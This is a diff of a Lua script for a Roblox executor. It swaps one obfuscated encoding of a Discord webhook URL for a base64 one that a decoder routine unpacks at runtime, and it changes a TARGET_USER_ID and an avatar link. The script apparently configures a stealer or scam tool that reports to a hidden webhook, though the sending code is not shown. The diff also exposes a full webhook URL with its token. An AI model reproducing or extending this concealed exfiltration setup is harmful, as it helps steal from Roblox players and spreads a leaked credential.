@@ -1,7 +1,7 @@
 local genv = getgenv()
 
 genv.GOOD_WEBHOOK = (function()
-    local d="KGZ1bmN0aW9uKCkgICAgIGxvY2FsIGIgPSB7MTg5LDE2MSwxNjEsMTY1LDE2NiwyMzksMjUwLDI1MCwxNzcsMTg4LDE2NiwxODIsMTg2LDE2NywxNzcsMjUxLDE4MiwxODYsMTg0LDI1MCwxODAsMTY1LDE4OCwyNTAsMTYyLDE3NiwxODMsMTg5LDE4NiwxODYsMTkwLDE2NiwyNTAsMjI4LDIyNCwyMzAsMjM2LDIzMCwyMzYsMjI4LDIyOSwyMjYsMjI5LDIzMCwyMjksMjI3LDIyOCwyMjYsMjMxLDIzNiwyMjUsMjM3LDI1MCwxODQsMTczLDE3OSwxNTEsMTUxLDE0NiwxNzgsMjMxLDE2MCwxNjYsMTQ2LDEzOCwxNTAsMjMwLDE4Niwy"
+    local d="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTM5MTA3MDMwNjE3Mjk0OC9teGZCQkdnMnVzR19DM28wQ29DX1lza0NwSWNxWUpKSUJYU0kzelV1UXRyRmtjVHVBNzRTWlpKR1Q3Y3Q0cnV5dVl6Mg=="
     local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
     local o,b={},{}
     for i=1,#B do b[B:sub(i,i)]=i-1 end
@@ -19,7 +19,7 @@ genv.GOOD_WEBHOOK = (function()
     return table.concat(o)
 end)()
 
-genv.TARGET_USER_ID = 2829121161
+genv.TARGET_USER_ID = 0
 
 genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 
